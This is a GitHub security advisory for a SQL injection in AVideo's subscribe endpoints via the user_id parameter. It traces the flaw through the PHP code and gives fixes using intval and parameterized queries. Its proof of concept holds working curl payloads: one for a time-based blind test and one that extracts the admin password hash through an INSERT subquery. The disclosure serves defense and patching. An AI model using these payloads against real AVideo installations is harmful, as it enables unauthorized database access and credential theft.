# [H] AVideo is Vulnerable to SQL Injection through Subscribe Endpoint via Unsanitized user_id Parameter

## Summary
Severity: High
Advisory: GHSA-ffr8-fxhv-fv8h
CVE: CVE-2026-33723
CWE: CWE-89
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N (CVSS_V3)
Published: 2026-03-25
Source: https://github.com/advisories/GHSA-ffr8-fxhv-fv8h
Type: github-advisory

## Affected
- Packagist: `wwbn/avideo` — affected >=0

## Details
## Summary

The `Subscribe::save()` method in `objects/subscribe.php` concatenates the `$this->users_id` property directly into an INSERT SQL query without sanitization or parameterized binding. This property originates from `$_POST['user_id']` in both `subscribe.json.php` and `subscribeNotify.json.php`. An authenticated attacker can inject arbitrary SQL to extract sensitive data from any database table, including password hashes, API keys, and encryption salts.

## Details

The vulnerability exists because of a disconnect between where `intval()` is applied and where the value is used in SQL.

**Entry points** — `objects/subscribe.json.php:40` and `objects/subscribeNotify.json.php:23`:

```php
// subscribe.json.php line 40
$subscribe = new Subscribe(0, $_POST['email'], $_POST['user_id'], User::getId());
```

**Constructor stores raw value** — `objects/subscribe.php:34`:

```php
public function __construct($id, $email = "", $user_id = "", $subscriber_users_id = "")
{
    // ...
    $this->users_id = $user_id;  // Raw $_POST['user_id'], no sanitization
    $this->subscriber_users_id = $subscriber_users_id;
    if (empty($this->id)) {
        $this->loadFromId($this->subscriber_users_id, $user_id, "");
    }
}
```

**`getSubscribeFromID` sanitizes local copies only** — `objects/subscribe.php:137-139`:

```php
public static function getSubscribeFromID($subscriber_users_id, $user_id, $status = "a"){
    $subscriber_users_id = intval($subscriber_users_id);  // Local variable only
    $user_id = intval($user_id);  // Local variable only — $this->users_id is NOT affected
```

When `getSubscribeFromID` finds no matching subscription (the attacker simply targets a user_id they haven't subscribed to), `loadFromId()` returns false. The object's `$this->id` remains null, and `$this->users_id` retains the unsanitized injection payload.

**Vulnerable sink** — `objects/subscribe.php:88`:

```php
public function save()
{
    if (!empty($this->id)) {
        // UPDATE path (not reached when $this->id is null)
    } else {
        $this->status = 'a';
        $sql = "INSERT INTO subscribes (users_id, email, status, ip, created, modified, subscriber_users_id) 
                VALUES ('{$this->users_id}', ...";  // Direct concatenation of injected value
    }
    $saved = sqlDAL::writeSql($sql);  // Called with NO $formats or $values
```

**`sqlDAL::writeSql` provides no protection** — `objects/mysql_dal.php:102`:

When called without `$formats`/`$values` parameters (as `save()` does), the `eval_mysql_bind()` function at line 636 returns `true` without binding any parameters. The already-concatenated SQL string is passed directly to `$global['mysqli']->prepare()` and `execute()`, executing the injection as the prepared statement itself.

## PoC

**Prerequisites:** An authenticated session on the target AVideo instance.

**Step 1: Confirm injection with time-based blind SQLi**

```bash
# Pick a user_id that the current user has NOT subscribed to (e.g., 99999)
# The SLEEP(5) will cause a ~5 second delay confirming injection
curl -s -o /dev/null -w "%{time_total}" \
  -b 'PHPSESSID=VALID_SESSION_ID' \
  -d "user_id=99999'+AND+SLEEP(5)+AND+'1" \
  https://target/objects/subscribe.json.php
# Expected: ~5 second response time (vs <1 second normally)
```

**Step 2: Extract admin password hash via INSERT subquery**

```bash
# Inject a subquery that reads the admin password hash into the email column
curl -b 'PHPSESSID=VALID_SESSION_ID' \
  -d "user_id=99999',(SELECT+pass+FROM+users+WHERE+isAdmin=1+LIMIT+1),'a','1.1.1.1',now(),now(),'1');%23" \
  https://target/objects/subscribe.json.php
```

This closes the `VALUES` clause with attacker-controlled data and comments out the rest of the query. The admin password hash is inserted into the `email` column of the `subscribes` table, which can be read back via the subscription list API.

**Step 3: Read exfiltrated data**

The injected row is readable via any endpoint that queries the `subscribes` table and returns the `email` field (e.g., `getAllSubscribes()`).

The same attack works against `objects/subscribeNotify.json.php` via the same `user_id` parameter.

## Impact

- **Full database read access:** An attacker with any authenticated account can extract arbitrary data from all database tables using INSERT subqueries, including:
  - User password hashes (`users.pass`)
  - Admin credentials
  - Encryption salts and API keys from configuration tables
  - Email addresses and personal data of all users
- **Data integrity:** The attacker can insert arbitrary rows into the `subscribes` table.
- **Two affected endpoints:** Both `subscribe.json.php` and `subscribeNotify.json.php` pass raw `$_POST['user_id']` to the vulnerable code path.

## Recommended Fix

Apply `intval()` to `$this->users_id` before use in the constructor, or better yet, use parameterized queries in `save()`.

**Option 1 — Sanitize in constructor** (minimal fix):

```php
// objects/subscribe.php, constructor (line 34)
- $this->users_id = $user_id;
+ $this->users_id = intval($user_id);
```

**Option 2 — Use parameterized query in save()** (recommended):

```php
// objects/subscribe.php, save() method (lines 87-90)
public function save()
{
    global $global;
    if (!empty($this->id)) {
        $sql = "UPDATE subscribes SET status = ?, notify = ?, ip = ?, modified = now() WHERE id = ?";
        $saved = sqlDAL::writeSql($sql, "sssi", [$this->status, $this->notify, getRealIpAddr(), $this->id]);
    } else {
        $this->status = 'a';
        $sql = "INSERT INTO subscribes (users_id, email, status, ip, created, modified, subscriber_users_id) VALUES (?, ?, ?, ?, now(), now(), ?)";
        $saved = sqlDAL::writeSql($sql, "isssi", [intval($this->users_id), $this->email, $this->status, getRealIpAddr(), intval($this->subscriber_users_id)]);
    }
```

Option 2 is strongly recommended as it also fixes the unsanitized `$this->email`, `$this->status`, and `getRealIpAddr()` values in both the INSERT and UPDATE paths, preventing any future injection through those fields.

## References
- https://github.com/WWBN/AVideo/security/advisories/GHSA-ffr8-fxhv-fv8h
- https://nvd.nist.gov/vuln/detail/CVE-2026-33723
- https://github.com/WWBN/AVideo/commit/36dfae22059fbd66fd34bbc5568a838fc0efd66c
- https://github.com/WWBN/AVideo
